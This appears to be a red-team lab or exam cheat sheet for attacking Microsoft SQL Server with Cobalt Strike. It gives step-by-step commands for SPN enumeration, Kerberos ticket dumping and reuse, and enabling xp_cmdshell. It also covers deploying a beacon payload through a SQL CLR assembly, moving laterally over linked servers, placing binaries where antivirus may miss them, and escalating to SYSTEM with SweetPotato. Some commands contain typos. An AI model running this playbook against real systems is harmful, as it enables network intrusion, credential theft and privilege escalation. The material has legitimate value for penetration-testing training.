# Microsoft SQL Server

* Code Execution
* Linked Servers
* Privilege Escalation

Cobalt strike - script manager - load - C:\Tools\SQL\SQL.cna

enumerate sql servers and their SPN values

```
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName

ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes name,samAccountName,servicePrincipalName,distinguishedName,member

portscan 10.10.120.0/23 1433 arp 1024
```

get detail for targeted sql server information

```
sql-1434udp 10.10.120.20

sql-info lon-db-1

sql-whoami lon-db-1

sql-query lon-db-1 "SELECT @@SERVERNAME"
```  

Use system beacon

```
krb_triage

krb_dump /user:rsteal /service:krbtgt
```

request service ticket for mssql MSSQLSvc/lon-db-1:1433

```
krb_asktgs /service:MSSQLSvc/lon-db-1.contoso.com:1433
```  

save ticket output to file with powershell

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\mssql.kirbi", [Convert]::FromBase64String("doIGhDCCBoCgAwIBBaEDAgEWoo <snip> sb24tZGMtMQ=="))
```

make fake empty token and import ticket file in beacon session:

```
make_token CONTOSO\rsteel FakePass
kerberos_ticket_use C:\Users\Attacker\Desktop\mssql.kirbi
run klist
sql-whoami lon-db-1
```

Determine if xp_cmdshell enabled?

```sql
sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'"
```  

Enable xp cmd

```
sql-enablexp lon-db-1
```  

craft payload and generate Code execution on SQL db server as rsteel is SQL sysadmin role priv.

>Cobalt Strike - Payloads - Windows Executable Stageless 

* listener: smb
* output: raw
* exit function: thread
* use x64 payload: enable checked
* save to: `c:\payloads\smb_x64.xthread.bin`  

>Visual Studio - New Project - Class Library (.NET Framework) C# Windows Library!  

* Project name: MyProcedure
* Place solution and project in same directory: enable checked
* Framework: .NET Framework 4.7.2

>Solution Explorer > Add Existing Item > `c:\payloads\smb_x64.xthread.bin`  
> Embedded resource enabled

```c

//update read embedded payload in code match name
"MyProcedure.smb.x64.xthread.bin"

```  

> release and build output DLL `C:\users\attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll`  

In beacon specify the function inside the dll:

```
sql-clr lon-db-1 C:\users\attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
```

Link to named pipe created on SQL server requires cifs ticket for the SMB named pipe:
!First request cifs ticket!

```
krb_asktgs /service:cifs/lon-db-1 /ticket:[TGT]
```

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs.kirbi", [Convert]::FromBase64String("[TGT]"))
```

```
kerberos_ticket_use C:\Users\Attacker\Desktop\cifs.kirbi
run klist

link lon-db-1 TSVCPIPE-4b2... <TAB> 
```

## SQL Lateral movement 

check links between sql servers and permissions

```
sql-links lon-db-1
sql-whoami lon-db-1 "" lon-db-2
```

Check rpc out and enable it required admin privileges

```
sql-checkrpc lon-db-1
sql-enaberpc lon-db-1 lon-db-2
```

Run shell code on linked sql server:  

```
sql-clr lon-db-1 C:\users\attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
run klist
```

connect to named pipe created, and Start another beacon on the remote linked server, due to network segmentation firewalls.

```
link lon-db-2 TSVCPIPE-<TAB>
```

## SQL Privilege Escalation

>run whoami on last hop linked sql server

```
whoami
```

Find the SeImpersonatePrivilege identified.

>Generate new payload for SeImpersonatePrivilege:

* Listener: tcp-local
* output: Windows EXE
* Exit function: process
* Use x64 payload: checked enabled
* save: `C:\Payloads\tcp-local_x64.exe`  

>On the beacon at end of network segment:
>move to directory on beacon where Antivirus my not detected binary execution!
>malluable payload need to be done in exam for opsec safe bypass detection!

```
cd C:\windows\serviceprofiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
pwd
ls
upload C:\Payloads\tcp-local_x64.exe
execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
```  

>sweetpotato run the binary to abuse the seImpersonatePriv 

```
connect localhost 1337
```  

New beacon spawned with system!

